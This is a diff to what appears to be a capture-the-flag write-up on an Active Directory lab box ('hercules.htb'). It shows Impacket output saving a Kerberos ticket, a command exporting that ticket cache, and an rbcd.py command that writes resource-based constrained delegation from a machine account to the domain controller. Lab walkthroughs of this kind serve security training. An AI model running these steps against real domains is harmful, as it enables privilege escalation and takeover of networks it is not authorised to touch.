@@ -1577,7 +1577,13 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in iis_webserver$.ccache
 ```
 
-The first step is to convert the password i set to an NTLM
+The first step is to grab the TGT
+
+```python
+export KRB5CCNAME=iis_webserver\$.ccache
+```
+
+Then export it
 
 ```python
 rbcd.py -delegate-from 'iis_webserver$' -delegate-to 'DC$' -dc-ip '10.129.58.200' -action 'write' 'hercules.htb/iis_webserver$' -k -no-pass -dc-host dc.hercules.htb
